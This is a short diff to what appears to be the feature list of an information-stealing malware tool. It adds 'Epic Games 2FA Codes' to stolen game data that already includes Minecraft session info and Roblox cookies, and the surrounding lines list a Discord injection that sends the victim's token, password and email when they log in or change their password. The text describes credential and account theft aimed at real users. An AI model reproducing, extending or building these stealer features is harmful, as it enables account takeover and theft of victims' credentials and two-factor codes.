@@ -37,6 +37,7 @@
 - Game Data
 	- Minecraft Session Info
 	- Roblox Cookie & Other Data
+ 	- Epic Games 2FA Codes
 
 - Discord Injection
     - Sends token, password & email on user login or when user changes password
